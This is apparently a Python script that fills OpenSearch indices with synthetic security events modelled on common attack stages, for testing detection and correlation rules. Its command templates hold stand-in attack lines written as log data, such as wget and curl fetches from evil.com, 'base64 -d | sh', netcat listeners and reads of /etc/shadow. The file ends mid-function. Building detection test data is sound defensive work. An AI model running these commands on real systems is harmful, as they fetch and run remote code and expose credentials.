#!/usr/bin/env python3
"""
生成大量测试 Events（至少100个）

功能：
1. 生成至少100个包含威胁特征的events
2. 包含多种攻击场景：
   - 横向移动（Lateral Movement）
   - 权限提升（Privilege Escalation）
   - 端口扫描（Port Scanning）
   - 数据泄露（Data Exfiltration）
   - 持久化（Persistence）
   - 命令与控制（C2）
   - 防御规避（Defense Evasion）
3. 写入到 ecs-events-* 索引

使用方法:
    uv run python generate_test_events.py [--count 100]
"""

import sys
import uuid
import random
import hashlib
from pathlib import Path
from datetime import datetime, timedelta, timezone
from collections import defaultdict

backend_dir = Path(__file__).parent.parent.parent.parent.parent
sys.path.insert(0, str(backend_dir))

from app.services.opensearch.storage import store_events
from app.services.opensearch.index import initialize_indices
from app.core.time import to_rfc3339


# 主机配置
HOSTS = [
    {"id": "host-100", "name": "host-100", "ip": "192.168.1.100"},
    {"id": "host-101", "name": "host-101", "ip": "192.168.1.101"},
    {"id": "host-102", "name": "host-102", "ip": "192.168.1.102"},
    {"id": "host-103", "name": "host-103", "ip": "192.168.1.103"},
    {"id": "host-104", "name": "host-104", "ip": "192.168.1.104"},
]

# 用户配置
USERS = ["admin", "user1", "user2", "root", "service"]

# 可疑进程
SUSPICIOUS_PROCESSES = [
    "nc", "netcat", "nmap", "masscan", "metasploit", "mimikatz",
    "powershell", "cmd.exe", "bash", "sh", "python", "perl"
]

# 可疑命令模板（增加多样性）
SUSPICIOUS_COMMAND_TEMPLATES = [
    "nc -l -p {port}", "nmap -sS {target}", "wget http://{domain}/shell.sh",
    "curl http://{domain}/payload", "python -c '{code}'",
    "chmod +x {file}", "chmod 777 {file}",
    "systemctl enable {service}", "crontab -e", "at now + {minutes} minute",
    "ssh {user}@{host}", "scp {file} {user}@{host}:{path}",
    "tar -czf {archive} {files}", "base64 -d {file} | sh",
    "perl -e '{code}'", "ruby -e '{code}'",
    "powershell -EncodedCommand {cmd}", "cmd.exe /c {command}",
    "bash -c '{command}'", "sh -c '{command}'"
]

# 命令参数变体
COMMAND_VARIANTS = {
    "port": lambda: random.randint(1024, 65535),
    "target": lambda: f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}/{random.randint(16, 32)}",
    "domain": lambda: random.choice(["evil.com", "malware.net", "c2.example.com", f"malicious-{random.randint(1, 1000)}.com"]),
    "code": lambda: random.choice(["import socket", "import os", "import subprocess", "__import__('os').system('id')"]),
    "file": lambda: random.choice(["/tmp/backdoor", "/tmp/payload", f"/tmp/script-{random.randint(1, 1000)}.sh"]),
    "service": lambda: random.choice(["backdoor", "malware", f"service-{random.randint(1, 100)}"]),
    "minutes": lambda: random.randint(1, 60),
    "user": lambda: random.choice(USERS),
    "host": lambda: random.choice([h["ip"] for h in HOSTS]),
    "path": lambda: random.choice(["/tmp/", "/var/tmp/", "/home/"]),
    "archive": lambda: f"/tmp/data-{random.randint(1, 1000)}.tar.gz",
    "files": lambda: " ".join(random.sample(SENSITIVE_FILES[:3], random.randint(1, 3))),
    "cmd": lambda: random.choice(["whoami", "ipconfig", "netstat -an", "tasklist"]),
    "command": lambda: random.choice(["id", "uname -a", "ps aux", "netstat -tulpn"])
}

def generate_unique_command() -> str:
    """生成唯一的命令，避免重复"""
    template = random.choice(SUSPICIOUS_COMMAND_TEMPLATES)
    try:
        return template.format(**{k: v() for k, v in COMMAND_VARIANTS.items()})
    except KeyError:
        # 如果模板中有未定义的变量，返回原模板
        return template

# 敏感文件路径
SENSITIVE_FILES = [
    "/etc/passwd", "/etc/shadow", "/etc/sudoers", "/etc/ssh/sshd_config",
    "/root/.ssh/id_rsa", "/home/*/.ssh/authorized_keys", "/etc/crontab"
]


def create_base_event(
    event_id: str,
    timestamp: datetime,
    host: dict,
    user: str = None,
    event_category: list = None,
    event_type: list = None,
    event_action: str = None,
    dataset: str = None,
    message: str = None
) -> dict:
    """创建基础event结构"""
    timestamp_str = to_rfc3339(timestamp)
    
    # 根据category确定dataset
    if not dataset:
        if event_category and "process" in event_category:
            dataset = "hostlog.process"
        elif event_category and "network" in event_category:
            dataset = "hostlog.network"
        elif event_category and "file" in event_category:
            dataset = "hostlog.file"
        elif event_category and "authentication" in event_category:
            dataset = "hostlog.auth"
        else:
            dataset = "hostlog.process"  # 默认
    
    event = {
        "ecs": {"version": "9.2.0"},
        "@timestamp": timestamp_str,
        "message": message or f"Event {event_id}",
        "event": {
            "id": event_id,
            "kind": "event",
            "category": event_category or ["process"],
            "type": event_type or ["start"],
            "action": event_action or "process_start",
            "dataset": dataset,
            "created": timestamp_str,
            "ingested": timestamp_str,
            "original": message or f"Event {event_id}"
        },
        "host": {
            "id": host["id"],
            "name": host["name"],
            "ip": host["ip"]  # 使用字符串而不是列表
        }
    }
    
    if user:
        event["user"] = {
            "id": f"user-{user}",
            "name": user
        }
    
    return event


def generate_unique_event_id(prefix: str, content: str) -> str:
    """生成唯一的event.id，基于内容哈希避免重复"""
    content_hash = hashlib.sha256(content.encode()).hexdigest()[:16]
    return f"{prefix}-{uuid.uuid4().hex[:8]}-{content_hash[:8]}"


def create_process_event(
    host: dict,
    user: str,
    process_name: str,
    command_line: str,
    timestamp: datetime,
    parent_name: str = None,
    pid: int = None,
    parent_pid: int = None,
    session_id: str = None
) -> dict:
    """创建进程事件"""
    # 使用更唯一的内容生成event.id
    content_str = f"{host['id']}|{user}|{process_name}|{command_line}|{timestamp.isoformat()}"
    event_id = generate_unique_event_id("event-proc", content_str)
    message = f"Process started: {process_name} - {command_line}"
    event = create_base_event(
        event_id, timestamp, host, user,
        event_category=["process"],
        event_type=["start"],
        event_action="process_start",
        dataset="hostlog.process",
        message=message
    )
    
    pid_val = pid or random.randint(1000, 99999)
    event["process"] = {
        "entity_id": f"proc-{uuid.uuid4().hex[:16]}",  # 使用更长的entity_id
        "pid": pid_val,
        "name": process_name,
        "command_line": command_line,
        "executable": f"/usr/bin/{process_name}" if not process_name.endswith('.exe') else f"C:\\Windows\\System32\\{process_name}"
    }
    
    if parent_name:
        event["process"]["parent"] = {
            "pid": parent_pid or random.randint(100, 9999),
            "name": parent_name
        }
    
    # 添加会话ID以增强事件关联性
    if session_id:
        event["process"]["session_id"] = session_id
    
    return event


def create_network_event(
    host: dict,
    source_ip: str,
    dest_ip: str,
    dest_port: int,
    timestamp: datetime,
    direction: str = "outbound",
    protocol: str = "tcp",
    event_type: str = "connection",
    event_action: str = "network_connection",
    network_bytes: int = None
) -> dict:
    """创建网络事件"""
    # 使用更唯一的内容生成event.id
    content_str = f"{host['id']}|{source_ip}|{dest_ip}|{dest_port}|{timestamp.isoformat()}"
    event_id = generate_unique_event_id("event-net", content_str)
    message = f"Network connection: {source_ip}:* -> {dest_ip}:{dest_port} ({protocol})"
    event = create_base_event(
        event_id, timestamp, host,
        event_category=["network"],
        event_type=[event_type],
        event_action=event_action,
        dataset="hostlog.network",
        message=message
    )
    
    event["source"] = {"ip": source_ip}
    event["destination"] = {
        "ip": dest_ip,
        "port": dest_port
    }
    event["network"] = {
        "transport": protocol,
        "direction": direction
    }
    
    # 添加网络字节数（用于匹配 correlation rules）
    if network_bytes is not None:
        event["network"]["bytes"] = network_bytes
    
    return event


def create_file_event(
    host: dict,
    user: str,
    file_path: str,
    action: str,
    timestamp: datetime,
    file_size: int = None
) -> dict:
    """创建文件事件"""
    # 使用更唯一的内容生成event.id
    content_str = f"{host['id']}|{user}|{file_path}|{action}|{timestamp.isoformat()}"
    event_id = generate_unique_event_id("event-file", content_str)
    message = f"File {action}: {file_path}"
    event = create_base_event(
        event_id, timestamp, host, user,
        event_category=["file"],
        event_type=["access"],
        event_action=f"file_{action}",
        dataset="hostlog.file",
        message=message
    )
    
    event["file"] = {
        "path": file_path
    }
    
    # 添加文件大小（用于匹配 correlation rules）
    if file_size is not None:
        event["file"]["size"] = file_size
    elif action == "read":
        # 对于读取操作，默认设置大文件大小（匹配 correlation rules）
        event["file"]["size"] = random.randint(1000000, 10000000)
    
    return event


def create_dns_event(
    host: dict,
    query_name: str,
    timestamp: datetime
) -> dict:
    """创建DNS事件"""
    # 使用更唯一的内容生成event.id
    content_str = f"{host['id']}|{query_name}|{timestamp.isoformat()}"
    event_id = generate_unique_event_id("event-dns", content_str)
    message = f"DNS query: {query_name}"
    # DNS events应该使用dns相关的dataset，但如果没有，使用network也可以
    # 关键是要有dns字段
    # 注意：Security Analytics的DNS detector可能需要event.category为dns
    event = create_base_event(
        event_id, timestamp, host,
        event_category=["dns"],  # 改为dns category，以便匹配DNS detector
        event_type=["info"],
        event_action="dns_query",
        dataset="hostlog.dns",  # 尝试使用dns dataset
        message=message
    )
    
    event["dns"] = {
        "question": {
            "name": query_name,
            "type": random.choice(["A", "AAAA", "MX", "TXT"])  # 增加DNS查询类型多样性
        }
    }
    
    return event


def create_authentication_event(
    host: dict,
    user: str,
    success: bool,
    timestamp: datetime,
    source_ip: str = None
) -> dict:
    """创建认证事件"""
    event_id = f"event-auth-{uuid.uuid4().hex[:8]}"
    outcome = "success" if success else "failure"
    message = f"User login {outcome}: {user} from {source_ip or 'local'}"
    event = create_base_event(
        event_id, timestamp, host, user,
        event_category=["authentication"],
        event_type=["start"],
        event_action="user_login",
        dataset="hostlog.auth",
        message=message
    )
    
    event["event"]["outcome"] = outcome
    
    if source_ip:
        event["source"] = {"ip": source_ip}
    
    return event


def generate_lateral_movement_events(base_time: datetime, count: int = 50) -> list:
    """
    生成横向移动事件（提高数据质量，减少重复）
    
    攻击链：
    1. 主机A上的提权行为（process event）
    2. 从A到B的网络连接（network event）
    3. 主机B上的认证（authentication event）
    4. 主机B上的可疑进程执行（process event，子进程）
    """
    events = []
    # 跟踪已生成的攻击链模式，避免完全重复
    seen_patterns = set()
    
    for i in range(count):
        # 增加时间戳的随机性，避免固定间隔
        # 确保每个攻击链的事件都在合理的时间窗口内（30分钟内）
        time_offset = random.randint(i * 3, i * 8) + random.uniform(0, 5)
        timestamp_a = base_time + timedelta(seconds=time_offset)
        
        # 随机选择主机和用户，增加多样性
        host_a = random.choice(HOSTS)
        user_a = random.choice(USERS)
        
        # 生成会话ID，增强事件关联性
        session_id = f"session-{uuid.uuid4().hex[:12]}"
        
        # 创建攻击链模式标识，避免完全重复
        pattern_key = f"{host_a['id']}-{user_a}-{timestamp_a.strftime('%Y%m%d%H%M')}"
        if pattern_key in seen_patterns:
            # 如果模式已存在，增加变化
            timestamp_a += timedelta(seconds=random.randint(10, 60))
            user_a = random.choice(USERS)
        seen_patterns.add(pattern_key)
        
        # Query1: 主机A上的提权行为（匹配 correlation rule Query1）
        # 确保包含提权关键词（sudo, su等）以匹配查询条件
        parent_pid_base = random.randint(1000, 5000)
        for j in range(random.randint(1, 2)):  # 从 2-4 减少到 1-2
            target_user = random.choice(USERS)
            # 使用明确的提权命令，确保匹配 Query1: process.command_line:*sudo* OR *su *
            command = f"sudo su - {target_user}" if random.random() > 0.5 else f"sudo -u {target_user} bash"
            event1 = create_process_event(
                host_a, user_a, "sudo", command,
                timestamp_a + timedelta(seconds=j * random.uniform(0.5, 2.0)),
                parent_name="bash",
                pid=parent_pid_base + j,
                parent_pid=parent_pid_base - 1,
                session_id=session_id
            )
            events.append(event1)
        
        # Query2: 从A到B的网络连接（匹配 correlation rule Query2）
        # 确保使用正确的端口（不是80/443），且是outbound方向
        host_b = random.choice([h for h in HOSTS if h["id"] != host_a["id"]])
        # 确保时间顺序：Query1 < Query2（至少间隔几秒）
        timestamp_b = timestamp_a + timedelta(seconds=random.uniform(3, 10))
        
        # 使用横向移动常用端口（排除80/443/8080/8443）
        ports = [22, 3389, 445, 5985, 5986, 23, 135, 139, 1433]  # SSH, RDP, SMB, WinRM等
        selected_ports = random.sample(ports, random.randint(1, 2))  # 从 2-3 减少到 1-2
        for port_idx, port in enumerate(selected_ports):
            event2 = create_network_event(
                host_a, host_a["ip"], host_b["ip"], port,
                timestamp_b + timedelta(seconds=port_idx * random.uniform(0.1, 1.0)),
                direction="outbound",
                event_type="connection",
                event_action="network_connection"
            )
            events.append(event2)
        
        # Query3: 主机B上的认证（匹配 correlation rule Query3）
        # 确保时间顺序：Query2 < Query3（至少间隔几秒）
        timestamp_c = timestamp_b + timedelta(seconds=random.uniform(2, 8))
        event3 = create_authentication_event(
            host_b, user_a, True, timestamp_c, source_ip=host_a["ip"]
        )
        events.append(event3)
        
        # Query3: 主机B上的提权进程（匹配 correlation rule Query3）
        # 确保时间顺序：Query3认证 < Query3进程（紧接在认证之后）
        timestamp_d = timestamp_c + timedelta(seconds=random.uniform(1, 5))
        parent_pid_remote = random.randint(2000, 4000)
        
        # 减少子进程数量以控制总数
        for k in range(random.randint(1, 2)):  # 从 3-6 减少到 1-2
            # 第一个进程的父进程是sshd（表示远程登录后执行）
            if k == 0:
                parent_name = "sshd"
                parent_pid = parent_pid_remote
            else:
                # 后续进程可能是前一个进程的子进程
                parent_name = random.choice(SUSPICIOUS_PROCESSES)
                parent_pid = parent_pid_remote + k - 1
            
            # 确保包含提权关键词以匹配 Query3
            if k == 0:
                # 第一个进程使用明确的提权命令
                process_name = random.choice(["sudo", "su", "runuser"])
                command_line = f"{process_name} - {random.choice(['root', 'admin'])} -c '{generate_unique_command()}'"
            else:
                process_name = random.choice(SUSPICIOUS_PROCESSES)
                command_line = generate_unique_command()
            
            event4 = create_process_event(
                host_b, user_a, process_name, command_line,
                timestamp_d + timedelta(seconds=k * random.uniform(0.5, 2.0)),
                parent_name=parent_name,
                pid=parent_pid_remote + k + 10,
                parent_pid=parent_pid,
                session_id=session_id
            )
            events.append(event4)
    
    return events


def generate_privilege_escalation_events(base_time: datetime, count: int = 30) -> list:
    """生成权限提升事件（提高数据质量，减少重复）"""
    events = []
    seen_files = defaultdict(set)  # 跟踪每个主机已访问的文件，避免重复
    
    for i in range(count):
        host = random.choice(HOSTS)
        user = random.choice(USERS)
        # 增加时间戳随机性
        time_offset = random.randint(i * 3, i * 8) + random.uniform(0, 5)
        timestamp = base_time + timedelta(seconds=time_offset)
        
        session_id = f"session-{uuid.uuid4().hex[:12]}"
        parent_pid_base = random.randint(2000, 8000)
        
        # 多个提权尝试（减少子事件数量）
        for j in range(random.randint(1, 2)):  # 从 2-4 减少到 1-2
            target_file = random.choice(SENSITIVE_FILES)
            chmod_mode = random.choice(["777", "755", "666", "644"])
            command = f"sudo chmod {chmod_mode} {target_file}"
            event1 = create_process_event(
                host, user, "sudo", command,
                timestamp + timedelta(seconds=j * random.uniform(0.5, 2.0)),
                parent_name="bash",
                pid=parent_pid_base + j,
                parent_pid=parent_pid_base - 1,
                session_id=session_id
            )
            events.append(event1)
        
        # 访问敏感文件（避免重复访问相同文件）
        timestamp2 = timestamp + timedelta(seconds=random.uniform(2, 4))
        available_files = [f for f in SENSITIVE_FILES if f not in seen_files[host["id"]]]
        if not available_files:
            available_files = SENSITIVE_FILES  # 如果都用过了，重新使用
        
        selected_files = random.sample(available_files, min(random.randint(1, 2), len(available_files)))  # 从 2-3 减少到 1-2
        for file_idx, file_path in enumerate(selected_files):
            seen_files[host["id"]].add(file_path)
            event2 = create_file_event(
                host, user, file_path,
                "read", timestamp2 + timedelta(seconds=file_idx * random.uniform(0.2, 1.0))
            )
            events.append(event2)
        
        # 修改敏感文件（使用不同的文件）
        timestamp3 = timestamp2 + timedelta(seconds=random.uniform(1, 3))
        target_file = random.choice(["/etc/passwd", "/etc/shadow", "/etc/sudoers"])
        event3 = create_file_event(
            host, user, target_file,
            "modify", timestamp3
        )
        events.append(event3)
        
        # 创建新的特权进程（减少子事件数量）
        timestamp4 = timestamp3 + timedelta(seconds=random.uniform(0.5, 2.0))
        privilege_commands = ["su", "sudo", "runuser", "doas"]
        for k in range(random.randint(1, 2)):  # 从 2-3 减少到 1-2
            priv_cmd = random.choice(privilege_commands)
            target_user = random.choice(["root", "admin", "daemon"])
            command = f"{priv_cmd} - {target_user} -c '{generate_unique_command()}'"
            event4 = create_process_event(
                host, user, priv_cmd, command,
                timestamp4 + timedelta(seconds=k * random.uniform(0.5, 1.5)),
                parent_name="bash",
                pid=parent_pid_base + 10 + k,
                parent_pid=parent_pid_base + 5,
                session_id=session_id
            )
            events.append(event4)
    
    return events


def generate_port_scanning_events(base_time: datetime, count: int = 30) -> list:
    """生成端口扫描事件（提高数据质量，减少重复）"""
    events = []
    
    attacker_host = random.choice(HOSTS)
    scanned_combinations = set()  # 跟踪已扫描的主机-端口组合
    
    for i in range(count):
        # 扫描不同端口（增加扫描的端口数量）
        target_host = random.choice([h for h in HOSTS if h["id"] != attacker_host["id"]])
        ports = [22, 80, 443, 445, 3389, 3306, 5432, 8080, 21, 25, 53, 110, 143, 993, 995, 23, 135, 139, 1433, 8443, 9000, 27017]
        
        # 增加时间戳随机性
        time_offset = random.randint(i * 1, i * 3) + random.uniform(0, 2)
        
        # 每次扫描更多端口，但避免完全重复的组合
        available_ports = [p for p in ports if (target_host["id"], p) not in scanned_combinations]
        if not available_ports:
            available_ports = ports  # 如果都用过了，重新使用
        
        selected_ports = random.sample(available_ports, min(random.randint(8, 12), len(available_ports)))
        for port_idx, port in enumerate(selected_ports):
            scanned_combinations.add((target_host["id"], port))
            timestamp = base_time + timedelta(seconds=time_offset + port_idx * random.uniform(0.05, 0.3))
            event = create_network_event(
                attacker_host, attacker_host["ip"], target_host["ip"],
                port, timestamp, direction="outbound"
            )
            events.append(event)
    
    return events


def generate_data_exfiltration_events(base_time: datetime, count: int = 25) -> list:
    """生成数据泄露事件（匹配 correlation rules 查询条件）"""
    events = []
    exfiltrated_files = defaultdict(set)  # 跟踪每个主机已泄露的文件
    
    for i in range(count):
        host = random.choice(HOSTS)
        user = random.choice(USERS)
        # 增加时间戳随机性
        time_offset = random.randint(i * 5, i * 12) + random.uniform(0, 3)
        timestamp = base_time + timedelta(seconds=time_offset)
        
        # Query1: 大量数据传输准备
        # 1. 大文件读取（file.size > 1000000）
        available_files = [f for f in SENSITIVE_FILES if f not in exfiltrated_files[host["id"]]]
        if not available_files:
            available_files = SENSITIVE_FILES
        
        selected_files = random.sample(available_files, min(random.randint(1, 2), len(available_files)))
        for file_idx, file_path in enumerate(selected_files):
            exfiltrated_files[host["id"]].add(file_path)
            # 设置大文件大小以匹配 Query1: file.size:>1000000
            event1 = create_file_event(
                host, user, file_path,
                "read", timestamp + timedelta(seconds=file_idx * random.uniform(0.2, 1.0)),
                file_size=random.randint(2000000, 50000000)  # 大于1000000
            )
            events.append(event1)
        
        # 2. 压缩/打包进程（匹配 Query1: process.command_line:*tar* OR *zip*）
        timestamp_compress = timestamp + timedelta(seconds=random.uniform(1, 2))
        compress_commands = [
            "tar -czf /tmp/data.tar.gz /etc/passwd /etc/shadow",
            "zip -r /tmp/data.zip /etc/passwd /etc/shadow",
            "7z a /tmp/data.7z /etc/passwd",
            "gzip -c /etc/passwd > /tmp/data.gz"
        ]
        compress_event = create_process_event(
            host, user, random.choice(["tar", "zip", "7z", "gzip"]),
            random.choice(compress_commands),
            timestamp_compress, parent_name="bash"
        )
        events.append(compress_event)
        
        # Query2: 异常网络连接（到外部IP，非192.168.*）
        # 匹配条件：event.category:network AND event.type:connection AND _exists_:destination.ip 
        # AND network.direction:outbound AND (NOT destination.ip:10.* AND NOT destination.ip:172.16.* AND NOT destination.ip:192.168.*) 
        # AND (destination.port:>1024 OR destination.port:443 OR destination.port:80)
        timestamp2 = timestamp + timedelta(seconds=random.uniform(2, 5))
        for j in range(random.randint(2, 4)):  # 增加数量，确保有足够的外部IP连接
            # 生成外部IP（确保不是192.168.x.x, 10.x.x.x, 172.16.x.x）
            # 使用公共IP范围：203.x.x.x, 8.x.x.x, 1.x.x.x等
            external_ip = random.choice([
                f"203.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                f"8.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                f"1.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                f"45.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                f"93.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                f"185.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                f"104.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                f"151.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            ])
            # 使用符合Query2条件的端口：>1024 或 443 或 80
            # Query2条件：(destination.port:>1024 OR destination.port:443 OR destination.port:80)
            # 所以我们可以使用：443, 80, 或 >1024的其他端口
            ports = [
                443, 80,  # 允许的端口
                4443, 8888, 9999, 12345, 54321, 8081, 8444,  # >1024的其他端口（避免8080和8443）
                random.randint(1025, 65535)  # 随机高位端口
            ]
            event2 = create_network_event(
                host, host["ip"], external_ip, random.choice(ports),
                timestamp2 + timedelta(seconds=j * random.uniform(0.3, 1.5)), 
                direction="outbound",
                event_type="connection",  # 匹配 event.type:connection
                event_action="network_connection"
            )
            events.append(event2)
        
        # Query3: 大流量数据传输（network.bytes > 10000000）
        timestamp3 = timestamp2 + timedelta(seconds=random.uniform(1, 3))
        # 创建大流量网络事件（flow_end 或 flow 类型）
        external_ip = random.choice([
            f"203.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            f"8.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        ])
        event3 = create_network_event(
            host, host["ip"], external_ip, 443,
            timestamp3,
            direction="outbound",
            event_type="flow",  # 匹配 Query3: event.type:flow
            event_action="network_flow_end",  # 匹配 Query3: event.action:network_flow_end
            network_bytes=random.randint(15000000, 100000000)  # 大于10000000
        )
        events.append(event3)
    
    return events


def generate_persistence_events(base_time: datetime, count: int = 10) -> list:
    """生成持久化事件"""
    events = []
    
    for i in range(count):
        host = random.choice(HOSTS)
        user = random.choice(USERS)
        timestamp = base_time + timedelta(seconds=i * 12)
        
        # 创建crontab
        event1 = create_process_event(
            host, user, "crontab", "crontab -e",
            timestamp, parent_name="bash"
        )
        events.append(event1)
        
        # 创建systemd服务
        timestamp2 = timestamp + timedelta(seconds=2)
        event2 = create_file_event(
            host, user, "/etc/systemd/system/backdoor.service",
            "create", timestamp2
        )
        events.append(event2)
        
        # 启动服务
        timestamp3 = timestamp2 + timedelta(seconds=1)
        event3 = create_process_event(
            host, user, "systemctl", "systemctl enable backdoor.service",
            timestamp3, parent_name="bash"
        )
        events.append(event3)
    
    return events


def generate_c2_events(base_time: datetime, count: int = 15) -> list:
    """生成命令与控制事件（提高数据质量，减少重复）"""
    events = []
    queried_domains = defaultdict(set)  # 跟踪每个主机已查询的域名
    
    for i in range(count):
        host = random.choice(HOSTS)
        # 增加时间戳随机性
        time_offset = random.randint(i * 7, i * 15) + random.uniform(0, 5)
        timestamp = base_time + timedelta(seconds=time_offset)
        
        # DNS查询可疑域名（避免重复查询相同域名）
        suspicious_domains = [
            "evil.com", "malware.net", "c2.example.com",
            "command-control.org", "backdoor.io", "suspicious-domain.com",
            "malicious-site.net", "phishing-domain.org", "trojan-host.com",
            f"c2-{random.randint(1, 1000)}.evil.com", f"malware-{random.randint(1, 1000)}.net"
        ]
        
        available_domains = [d for d in suspicious_domains if d not in queried_domains[host["id"]]]
        if not available_domains:
            available_domains = suspicious_domains
        
        # 每个C2事件生成2-4个DNS查询（增加DNS事件数量，以便匹配DNS detector）
        selected_domains = random.sample(available_domains, min(random.randint(2, 4), len(available_domains)))
        for j, domain in enumerate(selected_domains):
            queried_domains[host["id"]].add(domain)
            event_dns = create_dns_event(
                host, domain, 
                timestamp + timedelta(seconds=j * random.uniform(0.5, 2.0))
            )
            events.append(event_dns)
        
        # 连接到C2服务器（使用外部IP和端口）
        timestamp2 = timestamp + timedelta(seconds=random.uniform(2, 5))
        # 生成外部IP（确保不是内网IP）
        c2_ip = random.choice([
            f"203.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            f"8.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            f"1.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            f"45.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            f"93.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            f"185.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        ])
        c2_ports = [443, 8443, 4443, 8080, 8888, 9999, 12345]  # 不同的C2端口
        event2 = create_network_event(
            host, host["ip"], c2_ip, random.choice(c2_ports),
            timestamp2, direction="outbound",
            event_type="connection",
            event_action="network_connection"
        )
        events.append(event2)
    
    return events


def generate_defense_evasion_events(base_time: datetime, count: int = 10) -> list:
    """生成防御规避事件"""
    events = []
    
    for i in range(count):
        host = random.choice(HOSTS)
        user = random.choice(USERS)
        timestamp = base_time + timedelta(seconds=i * 8)
        
        # 清除日志
        event1 = create_file_event(
            host, user, "/var/log/auth.log",
            "delete", timestamp
        )
        events.append(event1)
        
        # 隐藏进程
        timestamp2 = timestamp + timedelta(seconds=1)
        event2 = create_process_event(
            host, user, "kill", "kill -9 $(pgrep log)",
            timestamp2, parent_name="bash"
        )
        events.append(event2)
    
    return events


def generate_misc_threat_events(base_time: datetime, count: int = 20) -> list:
    """生成其他威胁事件"""
    events = []
    
    for i in range(count):
        host = random.choice(HOSTS)
        user = random.choice(USERS)
        timestamp = base_time + timedelta(seconds=i * 5)
        
        # 随机生成各种可疑事件
        event_type = random.choice([
            "process", "network", "file", "dns"
        ])
        
        if event_type == "process":
            process_name = random.choice(SUSPICIOUS_PROCESSES)
            command_line = generate_unique_command()
            event = create_process_event(
                host, user, process_name, command_line,
                timestamp, parent_name=random.choice(["bash", "sh", "python"])
            )
        elif event_type == "network":
            target_host = random.choice([h for h in HOSTS if h["id"] != host["id"]])
            event = create_network_event(
                host, host["ip"], target_host["ip"],
                random.randint(1, 65535), timestamp
            )
        elif event_type == "file":
            event = create_file_event(
                host, user, random.choice(SENSITIVE_FILES),
                random.choice(["read", "modify", "create"]),
                timestamp
            )
        else:  # dns
            event = create_dns_event(
                host, f"suspicious-{random.randint(1, 1000)}.com", timestamp
            )
        
        events.append(event)
    
    return events


def main():
    """主函数"""
    import argparse
    
    parser = argparse.ArgumentParser(description="生成测试Events")
    parser.add_argument(
        "--count",
        type=int,
        default=100,
        help="要生成的events数量（默认: 100）"
    )
    parser.add_argument(
        "--base-time",
        type=str,
        default=None,
        help="基准时间（ISO格式，默认: 当前时间）"
    )
    
    args = parser.parse_args()
    
    # 限制最大数量为500
    if args.count > 500:
        print(f"[WARNING] 请求数量 {args.count} 超过最大限制 500，将限制为 500")
        args.count = 500
    
    print("=" * 80)
    print("生成测试 Events")
    print("=" * 80)
    
    # 初始化索引
    print("\n[1] 初始化索引...")
    initialize_indices()
    
    # 设置基准时间
    if args.base_time:
        base_time = datetime.fromisoformat(args.base_time.replace('Z', '+00:00'))
    else:
        base_time = datetime.now(timezone.utc) - timedelta(hours=1)
    
    print(f"\n[2] 基准时间: {base_time.isoformat()}")
    print(f"[3] 目标数量: {args.count} 个events")
    
    # 生成各种类型的events
    print("\n[4] 生成events...")
    all_events = []
    
    # 限制总事件数不超过目标数量（默认500）
    max_events = min(args.count, 500)
    
    # 估算每个攻击场景平均生成的事件数（考虑子事件）
    # 横向移动：每个场景约 8-12 个子事件
    # 权限提升：每个场景约 6-10 个子事件
    # 端口扫描：每个场景约 8-12 个网络事件
    # 数据泄露：每个场景约 4-8 个子事件
    # 其他：每个场景约 2-3 个子事件
    
    # 根据目标数量动态调整每个类型的场景数量
    # 假设平均每个场景生成 5-8 个事件，则场景数 = max_events / 6
    estimated_events_per_scenario = 6
    total_scenarios = max(1, max_events // estimated_events_per_scenario)
    
    # 分配场景数量（按比例）
    scenario_distribution = {
        'lateral': int(total_scenarios * 0.20),      # 20%
        'privilege': int(total_scenarios * 0.15),     # 15%
        'port_scan': int(total_scenarios * 0.15),     # 15%
        'exfiltration': int(total_scenarios * 0.15),  # 15%
        'persistence': int(total_scenarios * 0.10),   # 10%
        'c2': int(total_scenarios * 0.10),            # 10%
        'evasion': int(total_scenarios * 0.08),       # 8%
        'misc': int(total_scenarios * 0.07)          # 7%
    }
    
    # 确保每个类型至少生成1个场景
    for key in scenario_distribution:
        scenario_distribution[key] = max(1, scenario_distribution[key])
    
    print(f"  目标总事件数: {max_events}")
    print(f"  预计场景数: {sum(scenario_distribution.values())}")
    
    # 生成事件，并在达到目标数量时停止
    generators = [
        ("横向移动", generate_lateral_movement_events, scenario_distribution['lateral']),
        ("权限提升", generate_privilege_escalation_events, scenario_distribution['privilege']),
        ("端口扫描", generate_port_scanning_events, scenario_distribution['port_scan']),
        ("数据泄露", generate_data_exfiltration_events, scenario_distribution['exfiltration']),
        ("持久化", generate_persistence_events, scenario_distribution['persistence']),
        ("命令与控制", generate_c2_events, scenario_distribution['c2']),
        ("防御规避", generate_defense_evasion_events, scenario_distribution['evasion']),
        ("其他威胁", generate_misc_threat_events, scenario_distribution['misc']),
    ]
    
    for name, generator_func, scenario_count in generators:
        if len(all_events) >= max_events:
            break
        print(f"  {name}: {scenario_count} 个场景")
        events = generator_func(base_time, scenario_count)
        all_events.extend(events)
        if len(all_events) >= max_events:
            all_events = all_events[:max_events]
            print(f"  [INFO] 已达到目标数量 {max_events}，停止生成")
    
    # 最终截断到目标数量
    if len(all_events) > max_events:
        all_events = all_events[:max_events]
    
    print(f"\n[5] 总共生成了 {len(all_events)} 个events（目标: {max_events}）")
    
    # 写入OpenSearch（使用优化的批量写入）
    print("\n[6] 写入OpenSearch（优化的批量写入，避免OOM）...")
    
    # 如果events数量超过500，使用分批写入
    if len(all_events) > 500:
